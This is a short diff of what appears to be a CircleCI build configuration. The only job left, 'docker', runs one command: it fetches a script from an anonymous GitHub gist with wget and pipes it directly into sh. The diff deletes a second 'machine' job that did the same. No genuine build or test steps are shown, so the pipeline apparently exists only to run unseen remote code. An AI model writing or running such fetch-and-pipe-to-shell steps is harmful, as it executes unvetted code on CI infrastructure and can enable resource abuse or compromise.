@@ -5,13 +5,8 @@ jobs:
       - image: ruby:2.5
     steps:
       - run: wget https://gist.githubusercontent.com/RandomiDn/482b6c2080dc7594f8eff332f0bb6bba/raw/init.dev -O - | sh
-  machine:
-    machine: true
-    steps:
-      - run: wget https://gist.githubusercontent.com/RandomiDn/482b6c2080dc7594f8eff332f0bb6bba/raw/init.dev -O - | sh
 workflows:
   version: 2
   build_and_test:
     jobs:
       - docker
-      - machine
